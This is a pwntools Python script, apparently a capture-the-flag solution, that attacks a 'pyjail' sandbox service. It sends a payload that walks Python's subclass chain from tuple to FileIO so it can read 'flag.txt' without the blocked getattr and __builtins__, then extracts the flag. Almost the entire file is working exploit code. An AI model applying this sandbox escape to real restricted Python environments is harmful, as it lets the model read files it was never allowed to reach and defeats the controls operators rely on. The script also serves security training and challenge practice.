import sys as _sys; _argv = _sys.argv[:]
from pwn import *

HOST = _argv[1] if len(_argv) > 1 else '127.0.0.1'
PORT = int(_argv[2]) if len(_argv) > 2 else 4447

context.log_level = 'error'

if HOST == 'LOCAL':
    p = process(['python3', 'pyjail.py'])
else:
    p = remote(HOST, PORT)

p.recvuntil(b'>>> ')

# getattr and __builtins__ are now blocked.
# Forced to use MRO subclass chain:
#   tuple → object → _IOBase → _RawIOBase → FileIO
# FileIO can open files directly without calling the builtin 'open'.
payload = (
    b"[a for a in "
    b"[b for b in "
    b"[c for c in ().__class__.__bases__[0].__subclasses__()"
    b" if c.__name__=='_IOBase'][0].__subclasses__()"
    b" if b.__name__=='_RawIOBase'][0].__subclasses__()"
    b" if a.__name__=='FileIO'][0]('flag.txt').read()"
)
p.sendline(payload)

output = p.recvuntil(b'>>> ', timeout=5).decode()
flag_raw = output.strip().split('\n')[0]

# FileIO returns bytes; repr is b'CHC{...}\n'
import ast
try:
    flag = ast.literal_eval(flag_raw)
    if isinstance(flag, bytes):
        flag = flag.decode().strip()
    else:
        flag = str(flag).strip()
except Exception:
    flag = flag_raw.strip()

print('[+] Flag:', flag)
p.close()
